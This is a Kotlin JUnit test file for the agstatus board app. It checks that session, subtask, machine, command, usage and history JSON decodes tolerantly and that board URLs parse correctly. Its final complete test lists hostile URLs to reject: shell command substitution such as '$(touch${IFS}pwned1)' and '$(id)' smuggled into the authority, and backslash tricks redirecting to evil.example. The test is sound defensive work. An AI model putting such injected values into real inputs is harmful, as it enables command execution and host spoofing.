package com.kardanov.agstatus

import kotlinx.serialization.decodeFromString
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.boolean
import kotlinx.serialization.json.int
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.long
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/**
 * Wire-format tests for the decoder the REST and SSE clients share. The point
 * is tolerance: a board must survive an older or newer server, not crash on it.
 */
class ApiParsingTest {

    // MARK: - Session

    @Test
    fun sessionDecodesFromIdAlone() {
        val session = AgStatusJson.decodeFromString<Session>("""{"id":"sess-1"}""")

        assertEquals("sess-1", session.id)
        assertEquals("", session.name)
        assertEquals(AgentStatus.IDLE, session.status)
        assertEquals("", session.message)
        assertEquals("", session.project)
        assertEquals("claude", session.source)
        assertEquals(0L, session.createdAt)
        assertEquals(0L, session.updatedAt)
        assertEquals("sess-1", session.displayName)
    }

    @Test
    fun sessionDecodesEveryField() {
        val json = """
            {"id":"sess-abc","name":"Refactor auth","status":"coding",
             "message":"Editing server.ts","project":"my-repo","source":"codex",
             "createdAt":1752096000000,"updatedAt":1752096030000}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        assertEquals("Refactor auth", session.displayName)
        assertEquals(AgentStatus.CODING, session.status)
        assertTrue(session.status.isActive)
        assertEquals("codex", session.source)
        assertEquals(1752096030000L, session.updatedAt)
    }

    @Test
    fun unknownStatusDegradesToIdle() {
        val session = AgStatusJson.decodeFromString<Session>("""{"id":"s","status":"vibing"}""")

        assertEquals(AgentStatus.IDLE, session.status)
    }

    @Test
    fun unknownKeysAreIgnored() {
        val json = """
            {"id":"s","status":"blocked","priority":"high",
             "labels":["a","b"],"nested":{"deep":{"deeper":1}}}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        assertEquals(AgentStatus.BLOCKED, session.status)
    }

    @Test
    fun sessionListDecodes() {
        val json = """[{"id":"a","status":"done"},{"id":"b","status":"testing"}]"""

        val sessions = AgStatusJson.decodeFromString<List<Session>>(json)

        assertEquals(listOf("a", "b"), sessions.map { it.id })
        assertEquals(AgentStatus.DONE, sessions[0].status)
        assertEquals(AgentStatus.TESTING, sessions[1].status)
    }

    // MARK: - homeProject

    @Test
    fun sessionDecodesHomeProject() {
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","project":"web","homeProject":"acme-api"}""",
        )

        assertEquals("acme-api", session.homeProject)
        assertEquals("web", session.project)
    }

    @Test
    fun aServerTooOldToSendHomeProjectReadsAsEmpty() {
        val session = AgStatusJson.decodeFromString<Session>("""{"id":"s","project":"web"}""")

        assertEquals("", session.homeProject)
        assertEquals("web", ProjectSections.nameOf(session))
    }

    @Test
    fun aHomeProjectThatIsNotAStringReadsAsEmptyWithoutFailingTheBoard() {
        val json = """
            [{"id":"a","homeProject":null},{"id":"b","homeProject":7},
             {"id":"c","homeProject":{"name":"x"}},{"id":"d","homeProject":["x"]},
             {"id":"e","homeProject":"docs"}]
        """.trimIndent()

        val sessions = AgStatusJson.decodeFromString<List<Session>>(json)

        assertEquals(listOf("", "", "", "", "docs"), sessions.map { it.homeProject })
    }

    @Test
    fun homeProjectSurvivesAnEncodeAndDecode() {
        val session = Session(id = "s", project = "web", homeProject = "acme-api")
        val again = AgStatusJson.decodeFromString<Session>(AgStatusJson.encodeToString(session))

        assertEquals(session, again)
    }

    // MARK: - Host (Focus)

    @Test
    fun sessionDecodesHost() {
        val json = """
            {"id":"sess-abc","status":"blocked",
             "host":{"machine":{"id":"$MACHINE_ID","name":"MacBook"},
                     "app":{"slug":"agterm","name":"agterm","kind":"terminal"}}}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        val host = session.host!!
        assertEquals(MACHINE_ID, host.machine.id)
        assertEquals("MacBook", host.machine.name)
        assertEquals("MacBook", host.machine.displayName)
        assertEquals("agterm", host.app.slug)
        assertEquals("agterm", host.app.displayName)
        assertEquals("terminal", host.app.kind)
    }

    @Test
    fun sessionWithoutHostHasNone() {
        assertNull(AgStatusJson.decodeFromString<Session>("""{"id":"s"}""").host)
        assertNull(AgStatusJson.decodeFromString<Session>("""{"id":"s","host":null}""").host)
    }

    @Test
    fun malformedHostReadsAsNullWithoutFailingTheSession() {
        val malformed = listOf(
            """{"id":"s","status":"coding","host":"MacBook"}""",                      // not an object
            """{"id":"s","status":"coding","host":42}""",
            """{"id":"s","status":"coding","host":{"machine":"MacBook"}}""",          // machine not an object
            """{"id":"s","status":"coding","host":{"machine":{"name":"MacBook"}}}""", // no machine id
            """{"id":"s","status":"coding","host":{"app":{"slug":"agterm"}}}""",       // no machine at all
            """{"id":"s","status":"coding","host":{"machine":{"id":42,"name":"x"}}}""",
            """{"id":"s","status":"coding","host":{"machine":{"id":"mac-1","name":"x"}}}""", // not a per-board hash
        )

        for (json in malformed) {
            val session = AgStatusJson.decodeFromString<Session>(json)
            assertNull("expected no host for $json", session.host)
            assertEquals(AgentStatus.CODING, session.status)
        }
    }

    @Test
    fun hostToleratesMissingAppAndBlankLabels() {
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","host":{"machine":{"id":"$MACHINE_ID","name":""}}}"""
        )

        val host = session.host!!
        assertEquals("Machine", host.machine.displayName)
        assertEquals("other", host.app.slug)
        assertEquals("the app", host.app.displayName)
        assertEquals("unknown", host.app.kind)
    }

    @Test
    fun hostIgnoresUnknownKeys() {
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","host":{"machine":{"id":"$MACHINE_ID","name":"Mac","platform":"darwin"},
                "app":{"slug":"kitty","name":"kitty","kind":"terminal","bundle":"x"},"reach":"tab"}}"""
        )

        assertEquals("kitty", session.host?.app?.slug)
    }

    // MARK: - Subtasks

    @Test
    fun sessionDecodesSubtasks() {
        val json = """
            {"id":"$SESSION_ID","status":"blocked","message":"Needs approval: verify:hook",
             "subtasks":{"turnEnded":false,"running":9,"blocked":1,"failed":0,"done":15,"items":[
               {"id":"3f9c1e07b2d4a85c6e1f0a92","n":3,"label":"review:hook","state":"testing",
                "activity":"Run hook tests with --no-file-parallelism"},
               {"id":"a0d5b8e1c2f34a6b7d8e9f01","n":4,"label":"review:listener","state":"coding",
                "activity":"Editing listener.ts"},
               {"id":"9b2e7c4d1a0f3e5b6c8d7a90","n":9,"label":"verify:hook","state":"blocked",
                "activity":"Approve: Run the hook suite"}]}}
        """.trimIndent()

        val session = AgStatusJson.decodeFromString<Session>(json)

        val subtasks = session.subtasks!!
        assertFalse(subtasks.turnEnded)
        assertEquals(9, subtasks.running)
        assertEquals(1, subtasks.blocked)
        assertEquals(0, subtasks.failed)
        assertEquals(15, subtasks.done)
        assertEquals(listOf(3, 4, 9), subtasks.items.map { it.n })
        assertEquals(
            Subtask(
                id = "9b2e7c4d1a0f3e5b6c8d7a90",
                n = 9,
                label = "verify:hook",
                state = SubtaskState.BLOCKED,
                activity = "Approve: Run the hook suite",
            ),
            subtasks.items[2],
        )
        assertEquals(AgentStatus.BLOCKED, session.status)
        assertEquals(DisplayStatus.BLOCKED, session.displayStatus)
    }

    @Test
    fun absentNullOrMalformedSubtasksAreTodaysCard() {
        val cases = listOf(
            """{"id":"s","status":"coding"}""",
            """{"id":"s","status":"coding","subtasks":null}""",
            """{"id":"s","status":"coding","subtasks":"x"}""",
            """{"id":"s","status":"coding","subtasks":42}""",
            """{"id":"s","status":"coding","subtasks":true}""",
            """{"id":"s","status":"coding","subtasks":[]}""",
            """{"id":"s","status":"coding","subtasks":{}}""",
            // Nothing to show: no items and nothing done.
            """{"id":"s","status":"coding","subtasks":{"running":0,"done":0,"items":[]}}""",
            // Every item malformed is the same as none.
            """{"id":"s","status":"coding","subtasks":{"running":1,"items":[{"n":1},"x",7]}}""",
        )

        for (json in cases) {
            val session = AgStatusJson.decodeFromString<Session>(json)
            assertNull("expected no subtasks for $json", session.subtasks)
            assertEquals(AgentStatus.CODING, session.status)
            assertEquals(DisplayStatus.CODING, session.displayStatus)
        }
    }

    @Test
    fun aCountWithNoRowsStillShows() {
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","status":"coding","subtasks":{"done":12,"items":[]}}"""
        )

        assertEquals(12, session.subtasks?.done)
        assertEquals(emptyList<Subtask>(), session.subtasks?.items)
    }

    @Test
    fun aSnapshotSurvivesNullAndMalformedSubtasks() {
        val json = """
            [{"id":"a","status":"coding","subtasks":null},
             {"id":"b","status":"testing","subtasks":"x"},
             {"id":"c","status":"done","subtasks":{"items":[{"id":"k1","n":"one"},{"id":"k2","n":2,"label":"ok"}]}},
             {"id":"d","status":"idle"}]
        """.trimIndent()

        val sessions = AgStatusJson.decodeFromString<List<Session>>(json)

        assertEquals(listOf("a", "b", "c", "d"), sessions.map { it.id })
        assertNull(sessions[0].subtasks)
        assertNull(sessions[1].subtasks)
        assertEquals(listOf("k2"), sessions[2].subtasks?.items?.map { it.id })
        assertNull(sessions[3].subtasks)
    }

    @Test
    fun aMalformedItemIsDroppedAndTheOthersKept() {
        val json = """
            {"id":"s","status":"coding","subtasks":{"items":[
              {"id":"first","n":1,"label":"kept","state":"coding","activity":"Editing a.ts"},
              42,
              "row",
              null,
              {"n":2,"label":"no id"},
              {"id":7,"n":3,"label":"id not a string"},
              {"id":"has space","n":4,"label":"id off the agent-key shape"},
              {"id":"${"a".repeat(65)}","n":5,"label":"id too long"},
              {"id":"no-n","label":"no ordinal"},
              {"id":"zero-n","n":0,"label":"ordinal below one"},
              {"id":"text-n","n":"6","label":"ordinal as text"},
              {"id":"first","n":7,"label":"a repeated id"},
              {"id":"last.one:9","n":8,"label":"also kept","state":"testing"}]}}
        """.trimIndent()

        val items = AgStatusJson.decodeFromString<Session>(json).subtasks!!.items

        assertEquals(listOf("first", "last.one:9"), items.map { it.id })
        assertEquals(listOf("kept", "also kept"), items.map { it.label })
        assertEquals(listOf(1, 8), items.map { it.n })
    }

    @Test
    fun anUnknownItemStateReadsAsPlanning() {
        val json = """
            {"id":"s","subtasks":{"items":[
              {"id":"a","n":1,"label":"a","state":"researching"},
              {"id":"b","n":2,"label":"b"},
              {"id":"c","n":3,"label":"c","state":3},
              {"id":"d","n":4,"label":"d","state":"failed"}]}}
        """.trimIndent()

        val items = AgStatusJson.decodeFromString<Session>(json).subtasks!!.items

        assertEquals(
            listOf(SubtaskState.PLANNING, SubtaskState.PLANNING, SubtaskState.PLANNING, SubtaskState.FAILED),
            items.map { it.state },
        )
        assertEquals(SubtaskState.PLANNING, SubtaskState.fromWire(null))
        assertEquals(SubtaskState.BLOCKED, SubtaskState.fromWire("blocked"))
    }

    @Test
    fun aBlankOrMissingLabelOrActivityHasAFallback() {
        val json = """
            {"id":"s","subtasks":{"items":[
              {"id":"a","n":7,"label":"","activity":42},
              {"id":"b","n":8},
              {"id":"c","n":9,"label":12,"activity":"Bash"}]}}
        """.trimIndent()

        val items = AgStatusJson.decodeFromString<Session>(json).subtasks!!.items

        assertEquals(listOf("Subagent 7", "Subagent 8", "Subagent 9"), items.map { it.label })
        assertEquals(listOf("", "", "Bash"), items.map { it.activity })
    }

    @Test
    fun missingOrMalformedCountsAreDerivedFromTheItems() {
        val items = """
            "items":[{"id":"a","n":1,"label":"a","state":"coding"},
                     {"id":"b","n":2,"label":"b","state":"testing"},
                     {"id":"c","n":3,"label":"c","state":"blocked"},
                     {"id":"d","n":4,"label":"d","state":"failed"},
                     {"id":"e","n":5,"label":"e","state":"researching"}]
        """.trimIndent()
        val cases = listOf(
            """{"id":"s","subtasks":{$items}}""",
            """{"id":"s","subtasks":{"turnEnded":"true","running":-1,"blocked":"1","failed":1.5,"done":null,$items}}""",
            """{"id":"s","subtasks":{"turnEnded":1,"running":{},"blocked":[],"failed":true,"done":"9",$items}}""",
        )

        for (json in cases) {
            val subtasks = AgStatusJson.decodeFromString<Session>(json).subtasks!!
            assertFalse("turnEnded for $json", subtasks.turnEnded)
            assertEquals("running for $json", 3, subtasks.running)
            assertEquals("blocked for $json", 1, subtasks.blocked)
            assertEquals("failed for $json", 1, subtasks.failed)
            assertEquals("done for $json", 0, subtasks.done)
        }
    }

    @Test
    fun wellFormedCountsWinOverTheItems() {
        // The server lists at most eight failed rows and keeps the count exact.
        val failedRows = (1..8).joinToString(",") { """{"id":"f$it","n":$it,"label":"f$it","state":"failed"}""" }
        val session = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","subtasks":{"running":0,"blocked":0,"failed":11,"done":4,"items":[$failedRows]}}"""
        )

        assertEquals(11, session.subtasks?.failed)
        assertEquals(8, session.subtasks?.items?.size)
        assertEquals(4, session.subtasks?.done)
    }

    @Test
    fun subtasksSurviveAnEncodeDecodeRoundTrip() {
        val session = Session(
            id = "s",
            status = AgentStatus.DONE,
            message = "2 subagents still running",
            subtasks = Subtasks(
                turnEnded = true,
                running = 2,
                blocked = 0,
                failed = 1,
                done = 3,
                items = listOf(
                    Subtask(id = "k1", n = 1, label = "Watch the Android CI build", state = SubtaskState.TESTING,
                        activity = "gh run watch 1841"),
                    Subtask(id = "k2", n = 2, label = "Audit the strings", state = SubtaskState.FAILED,
                        activity = "Stopped"),
                    Subtask(id = "k3", n = 4, label = "Subagent 4", state = SubtaskState.PLANNING),
                ),
            ),
        )

        val decoded = AgStatusJson.decodeFromString<Session>(AgStatusJson.encodeToString(session))

        assertEquals(session, decoded)
        val bare = Session(id = "s")
        assertEquals(bare, AgStatusJson.decodeFromString<Session>(AgStatusJson.encodeToString(bare)))
    }

    @Test
    fun workingIsTheTurnOverWithASubagentRunningAndNothingBlocked() {
        fun display(status: String, subtasks: String): DisplayStatus =
            AgStatusJson.decodeFromString<Session>("""{"id":"s","status":"$status","subtasks":$subtasks}""")
                .displayStatus

        val running = """ "items":[{"id":"a","n":1,"label":"a","state":"testing"}]"""
        assertEquals(DisplayStatus.WORKING, display("done", """{"turnEnded":true,"running":1,$running}"""))
        assertEquals(DisplayStatus.WORKING, display("idle", """{"turnEnded":true,"running":1,$running}"""))
        // A blocked card stays BLOCKED: that is the one state that needs you.
        assertEquals(DisplayStatus.BLOCKED, display("blocked", """{"turnEnded":true,"running":1,$running}"""))
        // The parent's own turn still running: its own status.
        assertEquals(DisplayStatus.PLANNING, display("planning", """{"turnEnded":false,"running":1,$running}"""))
        // Nothing running: the wire status, whatever turnEnded says.
        assertEquals(
            DisplayStatus.DONE,
            display("done", """{"turnEnded":true,"running":0,"done":3,"items":[]}"""),
        )
        // Without subtasks every wire status reads as itself.
        for (status in AgentStatus.entries) {
            val session = Session(id = "s", status = status)
            assertEquals(status.wire, session.displayStatus.word)
        }
        assertEquals("Working", DisplayStatus.WORKING.label)
        assertTrue(DisplayStatus.WORKING.isActive)
        assertFalse(DisplayStatus.BLOCKED.isActive)
    }

    @Test
    fun aCardWithARunningSubagentIsNeverStale() {
        val running = """ "items":[{"id":"a","n":1,"label":"a","state":"coding"}]"""
        val withRunning = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","status":"coding","subtasks":{"running":1,$running}}"""
        )
        val onlyBlocked = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","status":"blocked","subtasks":{"items":[{"id":"a","n":1,"label":"a","state":"blocked"}]}}"""
        )
        val onlyCount = AgStatusJson.decodeFromString<Session>(
            """{"id":"s","status":"coding","subtasks":{"done":4,"items":[]}}"""
        )

        assertTrue(withRunning.isStaleExempt)
        assertFalse(onlyBlocked.isStaleExempt)
        assertFalse(onlyCount.isStaleExempt)
        assertFalse(Session(id = "s", status = AgentStatus.CODING).isStaleExempt)
    }

    // MARK: - Subtasks: a 1.7.0 server's own JSON
    //
    // Not written by hand: GET /api/sessions from a 1.7.0 server, seeded through
    // its webhook with the bodies a 1.7.0 hook posts, one session per scenario
    // (`seed-<scenario>`), re-indented with values and key order unchanged.
    // sessions-all.json is the whole response, which is also the data of the
    // SSE snapshot a board starts from; each sessions-<scenario>.json is one of
    // its sessions.

    @Test
    fun aRealServersSnapshotDecodesCompletely() {
        val snapshot = AgStatusJson.decodeFromString<List<Session>>(fixture("sessions-all.json"))
        // Every scenario, once: no card lost to a throw in another's subtasks.
        assertEquals(SCENARIOS.map { "seed-$it" }.sorted(), snapshot.map { it.id }.sorted())

        for (name in FIXTURES) {
            val raw = fixture(name)
            val sent = Json.parseToJsonElement(raw).jsonArray.map { sentSession(it.jsonObject) }
            val decoded = AgStatusJson.decodeFromString<List<Session>>(raw)

            assertEquals(name, sent.map { it.id }, decoded.map { it.id })
            for ((expected, actual) in sent.zip(decoded)) {
                val what = "${expected.id} in $name"
                assertEquals(what, expected.copy(subtasks = null), actual.copy(subtasks = null))
                // The counts as sent, and every row as sent, in start order:
                // nothing dropped, defaulted or re-read as a fallback.
                assertEquals(
                    "counts of $what",
                    expected.subtasks?.copy(items = emptyList()),
                    actual.subtasks?.copy(items = emptyList()),
                )
                assertEquals("rows of $what", expected.subtasks?.items, actual.subtasks?.items)
            }
        }
    }

    @Test
    fun aRealServerCountsTheRowsAsTheAppDoes() {
        for (session in AgStatusJson.decodeFromString<List<Session>>(fixture("sessions-all.json"))) {
            val subtasks = session.subtasks ?: continue
            val states = subtasks.items.map { it.state }
            // What the session screen's "9 running · 1 blocked" prints, and what
            // the decoder derives when a count is missing.
            assertEquals("running of ${session.id}", states.count { it.isWorking }, subtasks.running)
            assertEquals("blocked of ${session.id}", states.count { it == SubtaskState.BLOCKED }, subtasks.blocked)
            // At most eight failed rows are listed; the count stays exact.
            assertTrue("failed of ${session.id}", subtasks.failed >= states.count { it == SubtaskState.FAILED })
            // pick() takes the wire order as start order.
            val ordinals = subtasks.items.map { it.n }
            assertEquals("order of ${session.id}", ordinals.distinct().sorted(), ordinals)
        }
    }

    @Test
    fun onlyTheBackgroundScenarioReadsWorking() {
        val snapshot = AgStatusJson.decodeFromString<List<Session>>(fixture("sessions-all.json"))

        assertEquals(
            listOf("seed-background"),
            snapshot.filter { it.displayStatus == DisplayStatus.WORKING }.map { it.id },
        )
        // The server sends the busiest subagent's state; WORKING is the app's reading.
        val background = snapshot.single { it.id == "seed-background" }
        assertEquals(AgentStatus.TESTING, background.status)
        assertEquals("2 subagents still running", background.message)
        assertTrue(background.subtasks!!.turnEnded)
        // Every other card reads its wire status, the report hold included.
        for (session in snapshot - background) {
            assertEquals(session.id, DisplayStatus.of(session.status), session.displayStatus)
        }
    }

    /** A capture under src/test/resources/fixtures/subtasks/, byte for byte. */
    private fun fixture(name: String): String =
        checkNotNull(javaClass.getResourceAsStream("/fixtures/subtasks/$name")) { "no fixture $name" }
            .use { it.readBytes().decodeToString() }

    /**
     * A session as the server wrote it, read key by key without the app's
     * decoder: a missing key, a value of the wrong type, or a status or state
     * the app does not know fails here instead of reading as a fallback.
     */
    private fun sentSession(wire: JsonObject): Session {
        assertEquals("host of ${wire["id"]}", JsonNull, wire["host"])
        val status = wire.string("status")
        return Session(
            id = wire.string("id"),
            name = wire.string("name"),
            status = AgentStatus.entries.find { it.wire == status } ?: error("unknown status $status"),
            message = wire.string("message"),
            project = wire.string("project"),
            source = wire.string("source"),
            createdAt = wire.literal("createdAt").long,
            updatedAt = wire.literal("updatedAt").long,
            subtasks = wire["subtasks"]?.jsonObject?.let { subtasks ->
                Subtasks(
                    turnEnded = subtasks.literal("turnEnded").boolean,
                    running = subtasks.literal("running").int,
                    blocked = subtasks.literal("blocked").int,
                    failed = subtasks.literal("failed").int,
                    done = subtasks.literal("done").int,
                    items = subtasks.getValue("items").jsonArray.map { element ->
                        val item = element.jsonObject
                        val state = item.string("state")
                        Subtask(
                            id = item.string("id"),
                            n = item.literal("n").int,
                            label = item.string("label"),
                            state = SubtaskState.entries.find { it.wire == state } ?: error("unknown state $state"),
                            activity = item.string("activity"),
                        )
                    },
                )
            },
        )
    }

    private fun JsonObject.string(key: String): String =
        getValue(key).jsonPrimitive.also { assertTrue("$key is a string", it.isString) }.content

    /** A number or a boolean, never the same in quotes. */
    private fun JsonObject.literal(key: String): JsonPrimitive =
        getValue(key).jsonPrimitive.also { assertFalse("$key is not a string", it.isString) }

    // MARK: - Machines

    @Test
    fun machinesFrameDecodes() {
        val json = """
            [{"id":"$MACHINE_ID","name":"MacBook","online":true,"since":1752096000000},
             {"id":"$OTHER_ID","name":"PC","online":true,"since":1752096001000,"platform":"win32"}]
        """.trimIndent()

        val machines = AgStatusJson.decodeFromString<List<MachinePresence>>(json)

        assertEquals(listOf(MACHINE_ID, OTHER_ID), machines.map { it.id })
        assertEquals("MacBook", machines[0].name)
        assertTrue(machines[0].online)
        assertEquals(1752096000000L, machines[0].since)
        assertNull(machines[0].lastSeen)
    }

    @Test
    fun offlineMachineFrameKeepsTheNameItHad() {
        val online = AgStatusJson.decodeFromString<MachinePresence>(
            """{"id":"$MACHINE_ID","name":"MacBook","online":true,"since":1752096000000}"""
        )
        val offline = AgStatusJson.decodeFromString<MachinePresence>(
            """{"id":"$MACHINE_ID","online":false,"lastSeen":1752096900000}"""
        )

        assertEquals("", offline.name)
        assertFalse(offline.online)
        assertEquals(1752096900000L, offline.lastSeen)

        val merged = offline.mergedOver(online)
        assertEquals("MacBook", merged.name)
        assertFalse(merged.online)
        assertEquals(1752096900000L, merged.lastSeen)
        assertEquals(1752096000000L, merged.since)
        assertEquals(offline, offline.mergedOver(null))
    }

    // MARK: - Commands

    @Test
    fun commandRequestEncodesTheWireKeys() {
        val body = AgStatusJson.encodeToString(
            CommandRequest(id = COMMAND_ID, type = CommandType.FOCUS.wire, sessionId = "sess-abc")
        )

        assertEquals("""{"id":"$COMMAND_ID","type":"focus","session_id":"sess-abc"}""", body)
    }

    @Test
    fun commandReceiptDecodes() {
        val receipt = AgStatusJson.decodeFromString<CommandReceipt>(
            """{"id":"$COMMAND_ID","delivered":false,"expires_in_ms":120000}"""
        )

        assertEquals(COMMAND_ID, receipt.id)
        assertFalse(receipt.delivered)
        assertEquals(120000L, receipt.expiresInMs)
    }

    @Test
    fun commandAckDecodes() {
        val ack = AgStatusJson.decodeFromString<CommandAck>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","machine_id":"$MACHINE_ID",
                "type":"focus","result":"focused","reach":"tab","reason":null}"""
        )

        assertEquals(COMMAND_ID, ack.id)
        assertEquals("sess-abc", ack.sessionId)
        assertEquals(MACHINE_ID, ack.machineId)
        assertEquals(CommandResult.FOCUSED, CommandResult.fromWire(ack.result))
        assertEquals(CommandReach.TAB, CommandReach.fromWire(ack.reach))
        assertNull(ack.reason)
    }

    @Test
    fun commandAckWithUnknownReasonStillDecodes() {
        val ack = AgStatusJson.decodeFromString<CommandAck>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","machine_id":"$MACHINE_ID",
                "type":"focus","result":"failed","reach":null,"reason":"gremlins"}"""
        )

        assertEquals("gremlins", ack.reason)
        assertEquals(CommandResult.FAILED, CommandResult.fromWire(ack.result))
        assertNull(CommandReason.fromWire(ack.reason))
    }

    @Test
    fun commandStateDecodesAndReadsAsAnAck() {
        val pending = AgStatusJson.decodeFromString<CommandState>(
            """{"id":"$COMMAND_ID","type":"focus","session_id":"sess-abc","machine_id":"$MACHINE_ID",
                "state":"pending","result":null,"reach":null,"reason":null,
                "created_at":1752096000000,"expires_at":1752096120000,"claimed_at":null,"done_at":null}"""
        )
        assertFalse(pending.isFinished)

        val done = AgStatusJson.decodeFromString<CommandState>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","state":"done","result":"selected","reach":"pane"}"""
        )
        assertTrue(done.isFinished)
        assertEquals("selected", done.asAck().result)
        assertEquals("sess-abc", done.asAck().sessionId)

        val expired = AgStatusJson.decodeFromString<CommandState>(
            """{"id":"$COMMAND_ID","session_id":"sess-abc","state":"expired"}"""
        )
        assertTrue(expired.isFinished)
        assertEquals("failed", expired.asAck().result)
        assertEquals("expired", expired.asAck().reason)
    }

    // MARK: - Usage

    @Test
    fun usageWindowClampsOutOfRangePercentages() {
        val windows = AgStatusJson.decodeFromString<List<UsageWindow>>(
            """[{"id":"a","usedPct":142.5},{"id":"b","usedPct":-20},{"id":"c","usedPct":42}]"""
        )

        assertEquals(1.0f, windows[0].fraction, 0.0001f)
        assertEquals(0.0f, windows[1].fraction, 0.0001f)
        assertEquals(0.42f, windows[2].fraction, 0.0001f)
    }

    @Test
    fun usageWindowFallsBackToItsId() {
        val window = AgStatusJson.decodeFromString<UsageWindow>("""{"id":"week"}""")

        assertEquals("week", window.displayLabel)
        assertEquals(0.0f, window.fraction, 0.0001f)
        assertNull(window.resetsAt)
    }

    @Test
    fun usageInfoDecodesWindowsAndNamesSources() {
        val json = """
            [{"source":"claude","updatedAt":1752096030000,"windows":[
                {"id":"session","label":"Current session","usedPct":42,"resetsAt":1752100000000},
                {"id":"week","label":"Weekly (all models)","usedPct":61.5,"resetsAt":null}]},
             {"source":"codex","windows":[]},
             {"source":"gemini"}]
        """.trimIndent()

        val usage = AgStatusJson.decodeFromString<List<UsageInfo>>(json)

        assertEquals("Claude", usage[0].displayName)
        assertEquals(2, usage[0].windows.size)
        assertEquals("Current session", usage[0].windows[0].displayLabel)
        assertEquals(1752100000000L, usage[0].windows[0].resetsAt)
        assertEquals(0.615f, usage[0].windows[1].fraction, 0.0001f)
        assertNull(usage[0].windows[1].resetsAt)
        assertEquals("Codex", usage[1].displayName)
        assertEquals("Gemini", usage[2].displayName)
        assertEquals(emptyList<UsageWindow>(), usage[2].windows)
    }

    // MARK: - History

    @Test
    fun historyDecodesTimeline() {
        val json = """
            [{"seq":2,"status":"testing","message":"npm test","at":1752096030000},
             {"seq":1,"status":"coding","message":"Editing server.ts","at":1752096010000},
             {"seq":0,"status":"idle","message":"Session started","at":1752096000000}]
        """.trimIndent()

        val history = AgStatusJson.decodeFromString<List<HistoryEvent>>(json)

        assertEquals(listOf(2L, 1L, 0L), history.map { it.seq })
        assertEquals(AgentStatus.TESTING, history[0].status)
        assertEquals("npm test", history[0].message)
        assertEquals(1752096000000L, history[2].at)
    }

    @Test
    fun historyEventToleratesMissingFields() {
        val event = AgStatusJson.decodeFromString<HistoryEvent>("""{"seq":7,"status":"soaring"}""")

        assertEquals(7L, event.seq)
        assertEquals(AgentStatus.IDLE, event.status)
        assertEquals("", event.message)
        assertEquals(0L, event.at)
    }

    // MARK: - Board.parse

    @Test
    fun parsesWorkspaceUrl() {
        val board = Board.parse("https://agstatus.online/w/$TOKEN")

        assertEquals("https://agstatus.online", board?.baseUrl)
        assertEquals(TOKEN, board?.token)
        assertEquals("https://agstatus.online/w/$TOKEN", board?.boardUrl)
        assertEquals("https://agstatus.online/w/$TOKEN/webhook", board?.webhookUrl)
        assertTrue(board!!.isDefaultServer)
    }

    @Test
    fun parsesWorkspaceUrlWithTrailingSlashOrWebhookSuffix() {
        val expected = Board("https://agstatus.online", TOKEN)

        assertEquals(expected, Board.parse("https://agstatus.online/w/$TOKEN/"))
        assertEquals(expected, Board.parse("https://agstatus.online/w/$TOKEN/webhook"))
        assertEquals(expected, Board.parse("https://agstatus.online/w/$TOKEN/webhook/"))
        assertEquals(expected, Board.parse("  https://agstatus.online/w/$TOKEN  "))
    }

    @Test
    fun parsesLegacyOrigins() {
        assertEquals(Board("https://board.example.com", null), Board.parse("https://board.example.com"))
        assertEquals(Board("https://board.example.com", null), Board.parse("https://board.example.com/"))
        assertEquals(Board("https://board.example.com", null), Board.parse("https://board.example.com/webhook"))
        assertEquals(Board("http://192.168.1.10:8080", null), Board.parse("http://192.168.1.10:8080/"))
    }

    @Test
    fun legacyBoardServesItselfAsTheBoard() {
        val board = Board.parse("http://agstatus.local:4000")!!

        assertNull(board.token)
        assertEquals("http://agstatus.local:4000", board.boardUrl)
        assertEquals("http://agstatus.local:4000/webhook", board.webhookUrl)
        assertFalse(board.isDefaultServer)
    }

    @Test
    fun rejectsUrlsThatArentBoards() {
        val rejected = listOf(
            "agstatus.online/w/$TOKEN",              // no scheme
            "ftp://agstatus.online/w/$TOKEN",        // wrong scheme
            "https://",                              // no host
            "https:///w/$TOKEN",                     // no host
            "https://agstatus.online/w/ags_short",   // token too short
            "https://agstatus.online/w/$TOKEN!",     // token has an illegal character
            "https://agstatus.online/x/$TOKEN",      // wrong path prefix
            "https://agstatus.online/w/$TOKEN/extra",
            "https://agstatus.online/dashboard",
            "",
        )

        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
    }

    // MARK: - Board.parse: the authority is a host and nothing else

    @Test
    fun rejectsAuthoritiesCarryingUserinfoOrShellSyntax() {
        val rejected = listOf(
            // The reported QR: OkHttp reads the junk as a username and still
            // reaches agstatus.online, which is what made it convincing.
            "https://x;\$(touch\${IFS}pwned1);@agstatus.online/w/$TOKEN",
            "https://x;touch pwned2;@agstatus.online/w/$TOKEN",
            "https://user@agstatus.online/w/$TOKEN",
            "https://user:pass@agstatus.online/w/$TOKEN",
            "https://agstatus.online;id/w/$TOKEN",
            "https://agstatus.online\$(id)/w/$TOKEN",
            "https://x\$(id).example/w/$TOKEN",
            "https://`id`.example/w/$TOKEN",
            "https://a'b.example/w/$TOKEN",
            "https://agst atus.online/w/$TOKEN",
            "https://a%3Bb.example/w/$TOKEN",
            // Where OkHttp and a split on `/` would disagree about where the host ends.
            "https://agstatus.online\\@evil.example/w/$TOKEN",
            "https://evil.example\\agstatus.online/w/$TOKEN",
            "https://agstatus.online?x=1",
            "https://agstatus.online#frag",
        )

        rejected.forEach { assertNull("expected null for $it", Board.parse(it)) }
    }

    @Test
